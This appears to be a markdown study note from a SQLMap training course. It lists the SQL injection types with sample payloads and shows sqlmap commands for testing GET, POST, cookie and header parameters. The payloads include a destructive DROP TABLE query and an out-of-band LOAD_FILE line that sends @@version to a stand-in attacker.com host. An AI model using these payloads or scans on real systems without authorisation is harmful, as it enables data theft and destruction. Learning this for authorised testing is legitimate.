---
title: SQLMap Essentials
draft: false
tags:
  - SQL
---
***SQL INJECTION TYPES***

	SQLMap with the sqlmap -hh command:


```[!bash!]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```
The technique characters BEUSTQ refers to the following:

B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries

1. BOOLEAN-BASED BLIND 

	`AND 1=1`
	
	TRUE results are generally based on responses having none or marginal difference to the regular server response.

	FALSE results are based on responses having substantial differences from the regular server response.

	Boolean-based blind SQL Injection is considered as the most common SQLi type in web applications.

2. ERROR-BASED

	`AND GTID_SUBSET(@@version,0)`

3. UNION QUERY-BASED
	`UNION ALL SELECT 1,@@version,3`

4. STACKED QUERIES
	`; DROP TABLE users`

5. Time-based blind SQL Injection
	`AND 1=IF(2>1,SLEEP(5),0)`

6. INLINE QUERIES
	`SELECT (SELECT @@version) from`

7. OUT-OF-BAND SQL INJECTION
	`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
	

`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`
	'--batch' is used for skipping any required user-input

- **Log Messages Description**
	- `"target URL content is stable"`
		This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts.
	-  `"GET parameter 'id' appears to be dynamic"`
		It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.
	- `"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"`
		As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. ?id=1",)..).))'), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.
	- `"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"`
		While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.
	- `"reflective value(s) found and filtering out"`
		Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

***Running SQLMap on an HTTP Request***
- `Damxon@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`

	In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker * as follows:
	
		`Damxon@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`
- To run SQLMap with an HTTP request file, we use the -r flag, as follows:
	`Damxon@htb[/htb]$ sqlmap -r req.txt`
- Cookie value to *PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c*  option --cookie would be used as follows:
	`Damxon@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
		The same effect can be done with the usage of option -H/--header:
			`Damxon@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
- Also, if we wanted to specify an alternative HTTP method, other than GET and POST (e.g., PUT), we can utilize the option --method, as follows:
	`Damxon@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT`

**HANDLING ERRORS** 
- `--parse-errors`
	- With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.
- `-t /tmp/traffic.txt`
	- /tmp/traffic.txt file now contains all sent and received HTTP requests. So, we can now manually investigate these requests to see where the issue is occurring.
- `-v`
	- The -v 6 option will directly print all errors and full HTTP request to the terminal so that we can follow along with everything SQLMap is doing in real-time.
- `--proxy`
	- --proxy option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp). This will route all SQLMap traffic through Burp, so that we can later manually investigate all requests, repeat them, and utilize all features of Burp with these requests: